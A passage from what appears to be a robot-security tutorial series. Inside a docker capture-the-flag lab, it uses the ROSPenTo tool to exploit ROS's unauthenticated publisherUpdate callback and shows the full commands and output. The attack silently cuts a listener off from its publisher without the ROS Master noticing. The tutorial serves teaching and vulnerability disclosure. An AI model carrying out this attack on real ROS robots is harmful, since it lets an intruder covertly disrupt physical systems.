    <span id="cb263-6"><a href="#cb263-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Unregistering</span> /publisher</span></code></pre></div>
    <p>You will see that the listener stops getting messages. If we now verify it:</p>
    <div class="sourceCode" id="cb264"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb264-1"><a href="#cb264-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@655447dc534c:/#</span> rosnode list</span>
    <span id="cb264-2"><a href="#cb264-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/listener</span></span>
    <span id="cb264-3"><a href="#cb264-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/rosout</span></span></code></pre></div>
    <p>We observe that the ROS Master does not find <code>/publisher</code> anymore, it’s been unregistered. Furthermore, the process <code>talker</code> is still running:</p>
    <div class="sourceCode" id="cb265"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb265-1"><a href="#cb265-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@655447dc534c:/#</span> ps <span class="at">-e</span></span>
    <span id="cb265-2"><a href="#cb265-2" aria-hidden="true" tabindex="-1"></a>  <span class="ex">PID</span> TTY          TIME CMD</span>
    <span id="cb265-3"><a href="#cb265-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">1</span> pts/0    00:00:00 launch_script.b</span>
    <span id="cb265-4"><a href="#cb265-4" aria-hidden="true" tabindex="-1"></a>   <span class="ex">31</span> pts/0    00:00:00 roscore</span>
    <span id="cb265-5"><a href="#cb265-5" aria-hidden="true" tabindex="-1"></a>   <span class="ex">42</span> <span class="pp">?</span>        00:00:01 rosmaster</span>
    <span id="cb265-6"><a href="#cb265-6" aria-hidden="true" tabindex="-1"></a>   <span class="ex">55</span> <span class="pp">?</span>        00:00:01 rosout</span>
    <span id="cb265-7"><a href="#cb265-7" aria-hidden="true" tabindex="-1"></a>   <span class="ex">72</span> pts/0    00:00:00 bash</span>
    <span id="cb265-8"><a href="#cb265-8" aria-hidden="true" tabindex="-1"></a>   <span class="ex">78</span> pts/1    00:00:00 bash</span>
    <span id="cb265-9"><a href="#cb265-9" aria-hidden="true" tabindex="-1"></a>   <span class="ex">90</span> pts/0    00:00:00 talker</span>
    <span id="cb265-10"><a href="#cb265-10" aria-hidden="true" tabindex="-1"></a>  <span class="ex">108</span> pts/0    00:00:01 listener</span>
    <span id="cb265-11"><a href="#cb265-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">174</span> pts/1    00:00:00 ps</span></code></pre></div>
    <h3 id="resources-18">Resources</h3>
    <ul>
    <li>[1] Mendia, G. O., Juan, L. U. S., Bascaran, X. P., Calvo, A. B., Cordero, A. H., Ugarte, I. Z., … &amp; Vilches, V. M. (2018). Robotics CTF (RCTF), a playground for robot hacking. arXiv preprint arXiv:1810.02690.</li>
    <li>[2] Scenarios of the Robotics CTF (RCTF), a playground to challenge robot security. Retrieved from https://github.com/aliasrobotics/RCTF</li>
    <li>[3] Dieber, B., Breiling, B., Taurer, S., Kacianka, S., Rass, S., &amp; Schartner, P. (2017). Security for the Robot Operating System. Robotics and Autonomous Systems, 98, 192-203.</li>
    <li>[4] SROS2 Tutorial, IROS 2018. Retrieved from https://ruffsl.github.io/IROS2018_SROS2_Tutorial/.</li>
    <li>[5] roschaos. Retrieved from https://github.com/ruffsl/roschaos.</li>
    <li>[6] ROSPenTo. Retrieved from https://github.com/jr-robotics/ROSPenTo.</li>
    </ul>
    <h2 id="unauthenticated-updates-in-publisher-list-for-specified-topic">Unauthenticated updates in publisher list for specified topic</h2>
    <p>In this tutorial we’ll review how the <a href="http://wiki.ros.org/ROS/Slave_API">ROS Slave API</a>, used by every ROS Node in the robot network, presents a vulnerability in the <code>publisherUpdate</code> method. This method, used to update the publisher list for a specified ROS Topic requires no authentication:</p>
    <pre><code>publisherUpdate(caller_id, topic, publishers)

        Callback from master of current publisher list for specified topic.

        Parameters
            caller_id (str)
                ROS caller ID.

            topic (str)
                Topic name.

            publishers ([str])
                List of current publishers for topic in the form of XMLRPC URIs

        Returns (int, str, int)
            (code, statusMessage, ignore)
    </code></pre>
    <p>The main problem arises from the fact that Nodes within the ROS network do not poll the ROS Master for continuous updates. Instead, they solely register to the <code>publisherUpdate</code> callbacks which exposes them to any attacker making arbitrary use of this method. By exploiting this vulnerability, an attacker can potentially modify the list of publishers of an specific topic, affecting selected Nodes, while the rest of the ROS network isn’t affected, nor notices any change.</p>
    <p>This vulnerability has been reported at https://github.com/aliasrobotics/RVDP/issues/88.</p>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb267"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb267-1"><a href="#cb267-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity12:latest .</span></code></pre></div>
    <p>and run with:</p>
    <div class="sourceCode" id="cb268"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb268-1"><a href="#cb268-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">-it</span> basic_cybersecurity12:latest</span></code></pre></div>
    <hr />
    <p>Let’s start by listing the ROS Nodes and Topics participating in the network. After launching the container:</p>
    <div class="sourceCode" id="cb269"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb269-1"><a href="#cb269-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rosrun scenario1 talker <span class="kw">&amp;</span></span>
    <span id="cb269-2"><a href="#cb269-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rosrun scenario1 listener</span></code></pre></div>
    <p>Now, let’s get a second command line into the simulated robotic scenario running over docker. To do so:</p>
    <div class="sourceCode" id="cb270"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb270-1"><a href="#cb270-1" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">=</span><span class="op">&gt;</span> docker ps</span>
    <span id="cb270-2"><a href="#cb270-2" aria-hidden="true" tabindex="-1"></a><span class="ex">CONTAINER</span> ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS               NAMES</span>
    <span id="cb270-3"><a href="#cb270-3" aria-hidden="true" tabindex="-1"></a><span class="ex">935c390c1e49</span>        basic_cybersecurity12:latest   <span class="st">&quot;/root/launch_script…&quot;</span>   20 seconds ago      Up 19 seconds                           vibrant_chandrasekhar</span>
    <span id="cb270-4"><a href="#cb270-4" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb270-5"><a href="#cb270-5" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">=</span><span class="op">&gt;</span> docker exec <span class="at">-it</span> 935c390c1e49 /bin/bash</span>
    <span id="cb270-6"><a href="#cb270-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@935c390c1e49:/#</span></span></code></pre></div>
    <p>On the second terminal of the same docker instance:</p>
    <div class="sourceCode" id="cb271"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb271-1"><a href="#cb271-1" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb271-2"><a href="#cb271-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rosnode list</span>
    <span id="cb271-3"><a href="#cb271-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/listener</span></span>
    <span id="cb271-4"><a href="#cb271-4" aria-hidden="true" tabindex="-1"></a><span class="ex">/publisher</span></span>
    <span id="cb271-5"><a href="#cb271-5" aria-hidden="true" tabindex="-1"></a><span class="ex">/rosout</span></span>
    <span id="cb271-6"><a href="#cb271-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rostopic list</span>
    <span id="cb271-7"><a href="#cb271-7" aria-hidden="true" tabindex="-1"></a><span class="ex">/flag</span></span>
    <span id="cb271-8"><a href="#cb271-8" aria-hidden="true" tabindex="-1"></a><span class="ex">/rosout</span></span>
    <span id="cb271-9"><a href="#cb271-9" aria-hidden="true" tabindex="-1"></a><span class="ex">/rosout_agg</span></span></code></pre></div>
    <p>We can see that there’re several Nodes, we’re mainly interested on <code>/publisher</code> and <code>/listener</code>. Both, exchanging information through the <code>/flag</code> Topic as follows:</p>
    <div class="sourceCode" id="cb272"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb272-1"><a href="#cb272-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rostopic echo /flag</span>
    <span id="cb272-2"><a href="#cb272-2" aria-hidden="true" tabindex="-1"></a><span class="ex">data:</span> <span class="st">&quot;br{N(*-E6NgwbyWc&quot;</span></span>
    <span id="cb272-3"><a href="#cb272-3" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
    <span id="cb272-4"><a href="#cb272-4" aria-hidden="true" tabindex="-1"></a><span class="ex">data:</span> <span class="st">&quot;br{N(*-E6NgwbyWc&quot;</span></span>
    <span id="cb272-5"><a href="#cb272-5" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
    <span id="cb272-6"><a href="#cb272-6" aria-hidden="true" tabindex="-1"></a><span class="ex">data:</span> <span class="st">&quot;br{N(*-E6NgwbyWc&quot;</span></span>
    <span id="cb272-7"><a href="#cb272-7" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
    <span id="cb272-8"><a href="#cb272-8" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
    <h3 id="unregistering-publisher-from-listener-1">Unregistering <code>/publisher</code> from <code>/listener</code></h3>
    <p>Our fist objective is to unregister <code>/publisher</code> from <code>/subscriber</code>. We’ll do this through the ROS Master API in a way that’s only noticed by <code>/listener</code> and nobody else. Messages from <code>/publisher</code> will stop being processed by <code>/subscriber</code>. All this will happen while keeping it away from the ROS Master (and other non-targetted Nodes such as <code>/publisher</code>). To do so, we’ll use [3].</p>
    <p>First thing is to lauch <code>ROSPenTo</code> and analyze the system</p>
    <div class="sourceCode" id="cb273"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb273-1"><a href="#cb273-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@d64845e9601e:/#</span> rospento</span>
    <span id="cb273-2"><a href="#cb273-2" aria-hidden="true" tabindex="-1"></a><span class="ex">RosPenTo</span> <span class="at">-</span> Penetration testing tool for the Robot Operating System<span class="er">(</span><span class="ex">ROS</span><span class="kw">)</span></span>
    <span id="cb273-3"><a href="#cb273-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Copyright</span><span class="er">(</span><span class="ex">C</span><span class="kw">)</span> <span class="ex">2018</span> JOANNEUM RESEARCH Forschungsgesellschaft mbH</span>
    <span id="cb273-4"><a href="#cb273-4" aria-hidden="true" tabindex="-1"></a><span class="ex">This</span> program comes with ABSOLUTELY NO WARRANTY.</span>
    <span id="cb273-5"><a href="#cb273-5" aria-hidden="true" tabindex="-1"></a><span class="ex">This</span> is free software, and you are welcome to redistribute it under certain conditions.</span>
    <span id="cb273-6"><a href="#cb273-6" aria-hidden="true" tabindex="-1"></a><span class="ex">For</span> more details see the GNU General Public License at <span class="op">&lt;</span>http://www.gnu.org/licenses/<span class="op">&gt;</span>.</span>
    <span id="cb273-7"><a href="#cb273-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb273-8"><a href="#cb273-8" aria-hidden="true" tabindex="-1"></a><span class="ex">What</span> do you want to do<span class="pp">?</span></span>
    <span id="cb273-9"><a href="#cb273-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0:</span> Exit</span>
    <span id="cb273-10"><a href="#cb273-10" aria-hidden="true" tabindex="-1"></a><span class="ex">1:</span> Analyse system...</span>
    <span id="cb273-11"><a href="#cb273-11" aria-hidden="true" tabindex="-1"></a><span class="ex">2:</span> Print all analyzed systems</span>
    <span id="cb273-12"><a href="#cb273-12" aria-hidden="true" tabindex="-1"></a><span class="ex">1</span></span>
    <span id="cb273-13"><a href="#cb273-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb273-14"><a href="#cb273-14" aria-hidden="true" tabindex="-1"></a><span class="ex">Please</span> input URI of ROS Master: <span class="er">(</span><span class="ex">e.g.</span> http://localhost:11311/<span class="kw">)</span></span>
    <span id="cb273-15"><a href="#cb273-15" aria-hidden="true" tabindex="-1"></a><span class="ex">http://localhost:11311/</span></span></code></pre></div>
    <p>The results of the analysis should look like:</p>
    <div class="sourceCode" id="cb274"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb274-1"><a href="#cb274-1" aria-hidden="true" tabindex="-1"></a><span class="ex">System</span> 0: http://127.0.0.1:11311/</span>
    <span id="cb274-2"><a href="#cb274-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Nodes:</span></span>
    <span id="cb274-3"><a href="#cb274-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Node</span> 0.1: /listener <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:36963/<span class="kw">)</span></span>
    <span id="cb274-4"><a href="#cb274-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Node</span> 0.0: /publisher <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:40117/<span class="kw">)</span></span>
    <span id="cb274-5"><a href="#cb274-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Node</span> 0.2: /rosout <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:39955/<span class="kw">)</span></span>
    <span id="cb274-6"><a href="#cb274-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Topics:</span></span>
    <span id="cb274-7"><a href="#cb274-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Topic</span> 0.0: /flag <span class="er">(</span><span class="ex">Type:</span> std_msgs/String<span class="kw">)</span></span>
    <span id="cb274-8"><a href="#cb274-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Topic</span> 0.1: /rosout <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb274-9"><a href="#cb274-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Topic</span> 0.2: /rosout_agg <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb274-10"><a href="#cb274-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Services:</span></span>
    <span id="cb274-11"><a href="#cb274-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.3: /listener/get_loggers</span>
    <span id="cb274-12"><a href="#cb274-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.2: /listener/set_logger_level</span>
    <span id="cb274-13"><a href="#cb274-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.1: /publisher/get_loggers</span>
    <span id="cb274-14"><a href="#cb274-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.0: /publisher/set_logger_level</span>
    <span id="cb274-15"><a href="#cb274-15" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.4: /rosout/get_loggers</span>
    <span id="cb274-16"><a href="#cb274-16" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Service</span> 0.5: /rosout/set_logger_level</span>
    <span id="cb274-17"><a href="#cb274-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Communications:</span></span>
    <span id="cb274-18"><a href="#cb274-18" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Communication</span> 0.0:</span>
    <span id="cb274-19"><a href="#cb274-19" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Publishers:</span></span>
    <span id="cb274-20"><a href="#cb274-20" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.0: /publisher <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:40117/<span class="kw">)</span></span>
    <span id="cb274-21"><a href="#cb274-21" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Topic</span> 0.0: /flag <span class="er">(</span><span class="ex">Type:</span> std_msgs/String<span class="kw">)</span></span>
    <span id="cb274-22"><a href="#cb274-22" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Subscribers:</span></span>
    <span id="cb274-23"><a href="#cb274-23" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.1: /listener <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:36963/<span class="kw">)</span></span>
    <span id="cb274-24"><a href="#cb274-24" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Communication</span> 0.1:</span>
    <span id="cb274-25"><a href="#cb274-25" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Publishers:</span></span>
    <span id="cb274-26"><a href="#cb274-26" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.0: /publisher <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:40117/<span class="kw">)</span></span>
    <span id="cb274-27"><a href="#cb274-27" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.1: /listener <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:36963/<span class="kw">)</span></span>
    <span id="cb274-28"><a href="#cb274-28" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Topic</span> 0.1: /rosout <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb274-29"><a href="#cb274-29" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Subscribers:</span></span>
    <span id="cb274-30"><a href="#cb274-30" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.2: /rosout <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:39955/<span class="kw">)</span></span>
    <span id="cb274-31"><a href="#cb274-31" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Communication</span> 0.2:</span>
    <span id="cb274-32"><a href="#cb274-32" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Publishers:</span></span>
    <span id="cb274-33"><a href="#cb274-33" aria-hidden="true" tabindex="-1"></a>            <span class="ex">Node</span> 0.2: /rosout <span class="er">(</span><span class="ex">XmlRpcUri:</span> http://172.17.0.2:39955/<span class="kw">)</span></span>
    <span id="cb274-34"><a href="#cb274-34" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Topic</span> 0.2: /rosout_agg <span class="er">(</span><span class="ex">Type:</span> rosgraph_msgs/Log<span class="kw">)</span></span>
    <span id="cb274-35"><a href="#cb274-35" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Subscribers:</span></span>
    <span id="cb274-36"><a href="#cb274-36" aria-hidden="true" tabindex="-1"></a><span class="ex">Parameters:</span></span>
    <span id="cb274-37"><a href="#cb274-37" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Parameter</span> 0.0:</span>
    <span id="cb274-38"><a href="#cb274-38" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Name:</span> /roslaunch/uris/host_d64845e9601e__39259</span>
    <span id="cb274-39"><a href="#cb274-39" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Parameter</span> 0.1:</span>
    <span id="cb274-40"><a href="#cb274-40" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Name:</span> /rosdistro</span>
    <span id="cb274-41"><a href="#cb274-41" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Parameter</span> 0.2:</span>
    <span id="cb274-42"><a href="#cb274-42" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Name:</span> /rosversion</span>
    <span id="cb274-43"><a href="#cb274-43" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Parameter</span> 0.3:</span>
    <span id="cb274-44"><a href="#cb274-44" aria-hidden="true" tabindex="-1"></a>        <span class="ex">Name:</span> /run_id</span></code></pre></div>
    <p>Let’s now go ahead and unregister <code>/publisher</code>. First, in one terminal, launch <code>rosrun scenario1 listener</code>. Let’s now jump into another terminal and unregister the <code>/publisher</code>:</p>
    <div class="sourceCode" id="cb275"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb275-1"><a href="#cb275-1" aria-hidden="true" tabindex="-1"></a><span class="ex">What</span> do you want to do<span class="pp">?</span></span>
    <span id="cb275-2"><a href="#cb275-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0:</span> Exit</span>
    <span id="cb275-3"><a href="#cb275-3" aria-hidden="true" tabindex="-1"></a><span class="ex">1:</span> Analyse system...</span>
    <span id="cb275-4"><a href="#cb275-4" aria-hidden="true" tabindex="-1"></a><span class="ex">2:</span> Print all analyzed systems</span>
    <span id="cb275-5"><a href="#cb275-5" aria-hidden="true" tabindex="-1"></a><span class="ex">3:</span> Print information about analyzed system...</span>
    <span id="cb275-6"><a href="#cb275-6" aria-hidden="true" tabindex="-1"></a><span class="ex">4:</span> Print nodes of analyzed system...</span>
    <span id="cb275-7"><a href="#cb275-7" aria-hidden="true" tabindex="-1"></a><span class="ex">5:</span> Print node types of analyzed system <span class="er">(</span><span class="ex">Python</span> or C++<span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb275-8"><a href="#cb275-8" aria-hidden="true" tabindex="-1"></a><span class="ex">6:</span> Print topics of analyzed system...</span>
    <span id="cb275-9"><a href="#cb275-9" aria-hidden="true" tabindex="-1"></a><span class="ex">7:</span> Print services of analyzed system...</span>
    <span id="cb275-10"><a href="#cb275-10" aria-hidden="true" tabindex="-1"></a><span class="ex">8:</span> Print communications of analyzed system...</span>
    <span id="cb275-11"><a href="#cb275-11" aria-hidden="true" tabindex="-1"></a><span class="ex">9:</span> Print communications of topic...</span>
    <span id="cb275-12"><a href="#cb275-12" aria-hidden="true" tabindex="-1"></a><span class="ex">10:</span> Print parameters...</span>
    <span id="cb275-13"><a href="#cb275-13" aria-hidden="true" tabindex="-1"></a><span class="ex">11:</span> Update publishers list of subscriber <span class="er">(</span><span class="ex">add</span><span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb275-14"><a href="#cb275-14" aria-hidden="true" tabindex="-1"></a><span class="ex">12:</span> Update publishers list of subscriber <span class="er">(</span><span class="bu">set</span><span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb275-15"><a href="#cb275-15" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span> Update publishers list of subscriber <span class="er">(</span><span class="ex">remove</span><span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb275-16"><a href="#cb275-16" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span> Isolate service...</span>
    <span id="cb275-17"><a href="#cb275-17" aria-hidden="true" tabindex="-1"></a><span class="ex">15:</span> Unsubscribe node from parameter <span class="er">(</span><span class="ex">only</span> C++<span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb275-18"><a href="#cb275-18" aria-hidden="true" tabindex="-1"></a><span class="ex">16:</span> Update subscribed parameter at Node <span class="er">(</span><span class="ex">only</span> C++<span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb275-19"><a href="#cb275-19" aria-hidden="true" tabindex="-1"></a><span class="ex">13</span></span>
    <span id="cb275-20"><a href="#cb275-20" aria-hidden="true" tabindex="-1"></a><span class="ex">To</span> which subscriber do you want to send the publisherUpdate message<span class="pp">?</span></span>
    <span id="cb275-21"><a href="#cb275-21" aria-hidden="true" tabindex="-1"></a><span class="ex">Please</span> enter number of subscriber <span class="er">(</span><span class="ex">e.g.:</span> 0.0<span class="kw">)</span><span class="bu">:</span></span>
    <span id="cb275-22"><a href="#cb275-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0.1</span></span>
    <span id="cb275-23"><a href="#cb275-23" aria-hidden="true" tabindex="-1"></a><span class="ex">Which</span> topic should be affected<span class="pp">?</span></span>
    <span id="cb275-24"><a href="#cb275-24" aria-hidden="true" tabindex="-1"></a><span class="ex">Please</span> enter number of topic <span class="er">(</span><span class="ex">e.g.:</span> 0.0<span class="kw">)</span><span class="bu">:</span></span>
    <span id="cb275-25"><a href="#cb275-25" aria-hidden="true" tabindex="-1"></a><span class="ex">0.0</span></span>
    <span id="cb275-26"><a href="#cb275-26" aria-hidden="true" tabindex="-1"></a><span class="ex">Which</span> publisher<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="cf">do</span> <span class="ex">you</span> want to remove<span class="pp">?</span></span>
    <span id="cb275-27"><a href="#cb275-27" aria-hidden="true" tabindex="-1"></a><span class="ex">Please</span> enter number of publisher<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">e.g.:</span> 0.0,0.1,...<span class="kw">)</span><span class="bu">:</span></span>
    <span id="cb275-28"><a href="#cb275-28" aria-hidden="true" tabindex="-1"></a><span class="ex">0.0</span></span>
    <span id="cb275-29"><a href="#cb275-29" aria-hidden="true" tabindex="-1"></a><span class="ex">sending</span> publisherUpdate to subscriber <span class="st">&#39;/listener (XmlRpcUri: http://172.17.0.2:36963/)&#39;</span> over topic <span class="st">&#39;/flag (Type: std_msgs/String)&#39;</span> with publishers <span class="st">&#39;&#39;</span></span>
    <span id="cb275-30"><a href="#cb275-30" aria-hidden="true" tabindex="-1"></a><span class="ex">PublisherUpdate</span> completed successfully.</span></code></pre></div>
    <p>You should see that the <code>/listener</code> is not receiving information anymore.</p>
    <p>If we instrospect the ROS Master API through the command line tools ROS offers, we can see no change has happened in the nodes:</p>
    <div class="sourceCode" id="cb276"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb276-1"><a href="#cb276-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@19246d9bf44b:/#</span> rosnode list</span>
    <span id="cb276-2"><a href="#cb276-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/listener</span></span>
    <span id="cb276-3"><a href="#cb276-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/publisher</span></span>
    <span id="cb276-4"><a href="#cb276-4" aria-hidden="true" tabindex="-1"></a><span class="ex">/rosout</span></span></code></pre></div>
    <p>A further inspection of the ROS Master using <code>ROSPenTo</code> provides the exact same response. The following terminal dump implies a re-analysis and a latter print of the communications:</p>
    <div class="sourceCode" id="cb277"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb277-1"><a href="#cb277-1" aria-hidden="true" tabindex="-1"></a><span class="ex">sending</span> publisherUpdate to subscriber <span class="st">&#39;/listener (XmlRpcUri: http://172.17.0.2:41723/)&#39;</span> over topic <span class="st">&#39;/flag (Type: std_msgs/String)&#39;</span> with publishers <span class="st">&#39;&#39;</span></span>
    <span id="cb277-2"><a href="#cb277-2" aria-hidden="true" tabindex="-1"></a><span class="ex">PublisherUpdate</span> completed successfully.</span>
    <span id="cb277-3"><a href="#cb277-3" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb277-4"><a href="#cb277-4" aria-hidden="true" tabindex="-1"></a><span class="ex">What</span> do you want to do<span class="pp">?</span></span>
    <span id="cb277-5"><a href="#cb277-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0:</span> Exit</span>
    <span id="cb277-6"><a href="#cb277-6" aria-hidden="true" tabindex="-1"></a><span class="ex">1:</span> Analyse system...</span>
    <span id="cb277-7"><a href="#cb277-7" aria-hidden="true" tabindex="-1"></a><span class="ex">2:</span> Print all analyzed systems</span>
    <span id="cb277-8"><a href="#cb277-8" aria-hidden="true" tabindex="-1"></a><span class="ex">3:</span> Print information about analyzed system...</span>
    <span id="cb277-9"><a href="#cb277-9" aria-hidden="true" tabindex="-1"></a><span class="ex">4:</span> Print nodes of analyzed system...</span>
    <span id="cb277-10"><a href="#cb277-10" aria-hidden="true" tabindex="-1"></a><span class="ex">5:</span> Print node types of analyzed system <span class="er">(</span><span class="ex">Python</span> or C++<span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-11"><a href="#cb277-11" aria-hidden="true" tabindex="-1"></a><span class="ex">6:</span> Print topics of analyzed system...</span>
    <span id="cb277-12"><a href="#cb277-12" aria-hidden="true" tabindex="-1"></a><span class="ex">7:</span> Print services of analyzed system...</span>
    <span id="cb277-13"><a href="#cb277-13" aria-hidden="true" tabindex="-1"></a><span class="ex">8:</span> Print communications of analyzed system...</span>
    <span id="cb277-14"><a href="#cb277-14" aria-hidden="true" tabindex="-1"></a><span class="ex">9:</span> Print communications of topic...</span>
    <span id="cb277-15"><a href="#cb277-15" aria-hidden="true" tabindex="-1"></a><span class="ex">10:</span> Print parameters...</span>
    <span id="cb277-16"><a href="#cb277-16" aria-hidden="true" tabindex="-1"></a><span class="ex">11:</span> Update publishers list of subscriber <span class="er">(</span><span class="ex">add</span><span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-17"><a href="#cb277-17" aria-hidden="true" tabindex="-1"></a><span class="ex">12:</span> Update publishers list of subscriber <span class="er">(</span><span class="bu">set</span><span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-18"><a href="#cb277-18" aria-hidden="true" tabindex="-1"></a><span class="ex">13:</span> Update publishers list of subscriber <span class="er">(</span><span class="ex">remove</span><span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-19"><a href="#cb277-19" aria-hidden="true" tabindex="-1"></a><span class="ex">14:</span> Isolate service...</span>
    <span id="cb277-20"><a href="#cb277-20" aria-hidden="true" tabindex="-1"></a><span class="ex">15:</span> Unsubscribe node from parameter <span class="er">(</span><span class="ex">only</span> C++<span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-21"><a href="#cb277-21" aria-hidden="true" tabindex="-1"></a><span class="ex">16:</span> Update subscribed parameter at Node <span class="er">(</span><span class="ex">only</span> C++<span class="kw">)</span><span class="ex">...</span></span>
    <span id="cb277-22"><a href="#cb277-22" aria-hidden="true" tabindex="-1"></a><span class="ex">1</span></span>
    <span id="cb277-23"><a href="#cb277-23" aria-hidden="true" tabindex="-1"></a></span>
